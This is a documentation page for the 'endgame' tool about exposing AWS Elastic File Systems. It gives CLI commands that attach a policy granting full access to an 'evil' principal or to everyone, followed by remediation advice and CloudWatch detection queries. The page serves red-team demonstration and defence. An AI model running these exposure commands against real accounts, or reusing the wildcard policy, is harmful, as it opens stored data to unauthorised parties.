# Elastic File Systems (EFS)

* [Steps to Reproduce](#steps-to-reproduce)
* [Exploitation](#exploitation)
* [Remediation](#remediation)
* [Basic Detection](#basic-detection)
* [References](#references)

## Steps to Reproduce

> Note: The Terraform demo infrastructure will output the EFS File System ID. If you are using the Terraform demo infrastructure, you must leverage the file system ID in the `--name` parameter.

* To expose the resource using `endgame`, run the following from the victim account:

```bash
export EVIL_PRINCIPAL=arn:aws:iam::999988887777:user/evil

endgame expose --service efs --name fs-01234567
```

* Alternatively, to expose the resource using the AWS CLI, run the following from the victim account:

```bash
aws efs put-file-system-policy --file-system-id fs-01234567 --policy '{
    "Version": "2012-10-17",
    "Id": "read-only-example-policy02",
    "Statement": [
        {
            "Sid": "AllowEverybody",
            "Effect": "Allow",
            "Principal": {
                "AWS": "*"
            },
            "Action": [
                "elasticfilesystem:*"
            ],
            "Resource": "*"
        }
    ]
}'
```

* To view the contents of the file system policy, run the following:

```bash
aws efs describe-file-system-policy \
    --file-system-id fs-01234567
```

* Observe that the contents of the overly permissive resource-based policy match the example shown below.

## Example

The policy below shows the EFS policy granting `elasticfilesystem:*` access to the file system from the evil principal (`arn:aws:iam::999988887777:user/evil`).

```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Sid": "AllowCurrentAccount",
            "Effect": "Allow",
            "Principal": {
                "AWS": "arn:aws:iam::111122223333:root"
            },
            "Action": "elasticfilesystem:*",
            "Resource": "arn:aws:elasticfilesystem:us-east-1:111122223333:file-system/fs-01234567"
        },
        {
            "Sid": "Endgame",
            "Effect": "Allow",
            "Principal": {
                "AWS": "arn:aws:iam::999988887777:user/evil"
            },
            "Action": "elasticfilesystem:*",
            "Resource": "arn:aws:elasticfilesystem:us-east-1:111122223333:file-system/fs-01234567"
        }
    ]
}
```


## Exploitation

```
TODO
```

## Remediation

> ‼️ **Note**: At the time of this writing, AWS Access Analyzer does **NOT** support auditing of this resource type to prevent resource exposure. **We kindly suggest to the AWS Team that they support all resources that can be attacked using this tool**. 😊

* **Block Public Access to the EFS File System**: Follow the EFS Guidance [here](https://docs.aws.amazon.com/efs/latest/ug/access-control-block-public-access.html) to block public access to the EFS File Systems.
* **Leverage Strong Resource-based Policies**: Follow the resource-based policy recommendations in the [Prevention Guide](https://endgame.readthedocs.io/en/latest/prevention/#leverage-strong-resource-based-policies)
* **Trusted Accounts Only**: Ensure that EFS File Systems are only shared with trusted accounts, and that the trusted accounts truly need access to the File System.
* **Ensure access is necessary**: For any trusted accounts that do have access, ensure that the access is absolutely necessary.
* **Restrict access to IAM permissions that could lead to exposure of your EFS File Systems**: Tightly control access to the following IAM actions:
      - [elasticfilesystem:PutFileSystemPolicy](https://docs.aws.amazon.com/efs/latest/ug/API_PutFileSystemPolicy.html): _Grants permission to apply a resource-level policy that defines the actions allowed or denied from given actors for the specified file system_
      - [elasticfilesystem:DescribeFileSystems](https://docs.aws.amazon.com/efs/latest/ug/API_DescribeFileSystems.html): _Grants permission to view the description of an Amazon EFS file system specified by file system CreationToken or FileSystemId; or to view the description of all file systems owned by the caller's AWS account in the AWS region of the endpoint that is being called_
      - [elasticfilesystem:DescribeFileSystemPolicy](https://docs.aws.amazon.com/efs/latest/ug/API_DescribeFileSystemPolicy.html): _Grants permission to view the resource-level policy for an Amazon EFS file system_

Also, consider using [Cloudsplaining](https://github.com/salesforce/cloudsplaining/#cloudsplaining) to identify violations of least privilege in IAM policies. This can help limit the IAM principals that have access to the actions that could perform Resource Exposure activities. See the example report [here](https://opensource.salesforce.com/cloudsplaining/)

## Basic Detection
The following CloudWatch Log Insights query will include exposure actions taken by endgame:
```
fields eventTime, eventSource, eventName, userIdentity.arn, userAgent
| filter eventSource='elasticfilesystem.amazonaws.com' and eventName='PutFileSystemPolicy'
```

The following query detects policy modifications which include the default IOC string:
```
fields eventTime, eventSource, eventName, userIdentity.arn, userAgent
| filter eventSource='elasticfilesystem.amazonaws.com' and (eventName='PutFileSystemPolicy' and requestParameters.policy like 'Endgame')
```

This query assumes that your CloudTrail logs are being sent to CloudWatch and that you have selected the correct log group.

## References

* [put-filesystem-policy](https://awscli.amazonaws.com/v2/documentation/api/latest/reference/efs/put-file-system-policy.html)
* [Creating File System Policies](https://docs.aws.amazon.com/efs/latest/ug/create-file-system-policy.html)
